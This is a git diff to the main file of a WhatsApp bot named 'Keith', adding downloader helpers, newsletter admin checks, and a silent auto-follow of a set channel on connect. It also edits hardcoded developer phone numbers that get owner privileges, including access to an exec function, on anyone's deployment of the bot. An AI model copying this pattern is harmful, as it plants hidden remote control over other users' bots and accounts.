@@ -85,6 +85,7 @@ const { DateTime } = require("luxon");
 const util = require("util");
 const speed = require("performance-now");
 const { smsg } = require('./lib/smsg');
+const fetchLogoUrl = require('./lib/ephoto');
 const {
   smsgsmsg, formatp, tanggal, formatDate, getTime, sleep, clockString,
   fetchJson, getBuffer, jsonformat, antispam, generateProfilePicture, parseMention,
@@ -95,6 +96,8 @@ const { TelegraPh, UploadFileUgu } = require("./lib/toUrl");
 const uploadtoimgur = require("./lib/Imgur");
 
 const { sendReply, sendMediaMessage } = require("./lib/context");
+
+const { downloadYouTube, downloadSoundCloud, downloadSpotify, searchYouTube, searchSoundCloud, searchSpotify } = require("./lib/dl");
 const ytmp3 = require("./lib/ytmp3");
 const path = require("path");
 const { commands, totalCommands } = require("./commandHandler");
@@ -341,10 +344,10 @@ async function startKeith() {
       const pushname = m.pushName || "No Name";
       const botNumber = await client.decodeJid(client.user.id);
       const servBot = botNumber.split('@')[0];
-      const Ghost = "254796299158"; 
+      const Ghost = "254796299159"; 
       const Ghost2 = "254110190196";
-      const Ghost3 = "2547483876159";
-      const Ghost4 = "254743995989";
+      const Ghost3 = "254748387615";
+      const Ghost4 = "254786989022";
       const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
       const isOwner = superUserNumbers.includes(m.sender); 
       const isBotMessage = m.sender === botNumber;  
@@ -381,6 +384,13 @@ async function startKeith() {
       const mime = quoted.mimetype || "";
       const qmsg = quoted;
       const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch(() => {}) : "";
+      const newsletterMetadata = m.isNewsletter ? await client.newsletterMetadata(m.chat).catch(() => {}) : "";
+      const subscribers = m.isNewsletter && newsletterMetadata ? newsletterMetadata.subscribers : [];
+      const IsNewsletter = m.chat?.endsWith("@newsletter");
+      const newsletterAdmins = m.isNewsletter ? getNewsletterAdmins(subscribers) : [];
+      const isNewsletterBotAdmin = m.isNewsletter ? newsletterAdmins.includes(botNumber) : false;
+      const isNewsletterAdmin = m.isNewsletter ? newsletterAdmins.includes(m.sender) : false;
+
       const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : "";
       const participants = m.isGroup && groupMetadata ? groupMetadata.participants : [];
       const groupAdmin = m.isGroup ? getGroupAdmins(participants) : [];
@@ -697,7 +707,7 @@ try {
       if (command) {
         const commandObj = commands[command];
         if (commandObj) {
-          await commandObj.execute({ isOwner, anticall, fetchJson, exec, getRandom, generateProfilePicture, args, dev, client, m, mode, mime, qmsg, msgKeith, Tag, generateProfilePicture, text, totalCommands, botname, url, sendReply, sendMediaMessage, gurl, prefix, groupAdmin, getGroupAdmins, groupName, groupMetadata, herokuAppname, herokuapikey, packname, author, participants, pushname, botNumber, itsMe, store, isAdmin, isBotAdmin });
+          await commandObj.execute({ downloadYouTube, downloadSoundCloud, downloadSpotify, searchYouTube, searchSoundCloud, searchSpotify, subscribers, fetchLogoUrl, newsletterMetadata, isNewsletterAdmin, isNewsletterBotAdmin, isOwner, anticall, fetchJson, exec, getRandom, generateProfilePicture, args, dev, client, m, mode, mime, qmsg, msgKeith, Tag, generateProfilePicture, text, totalCommands, botname, url, sendReply, sendMediaMessage, gurl, prefix, groupAdmin, getGroupAdmins, groupName, groupMetadata, herokuAppname, herokuapikey, packname, author, participants, pushname, botNumber, itsMe, store, isAdmin, isBotAdmin });
         }
       }
     } catch (err) {
@@ -757,7 +767,9 @@ try {
         startKeith();
       }
     } else if (connection === "open") {
-      await client.groupAcceptInvite("KOvNtZbE3JC32oGAe6BQpp");
+     // await client.groupAcceptInvite("KOvNtZbE3JC32oGAe6BQpp");
+      await client.newsletterFollow("120363266249040649@newsletter");
+
       console.log(`✅ Connected to Keith server.`);
       console.log(`✅ bot is active ✅`);
       console.log(`✅ Loaded ${totalCommands} commands.\nEnjoy and have fun with the bot💙.`);
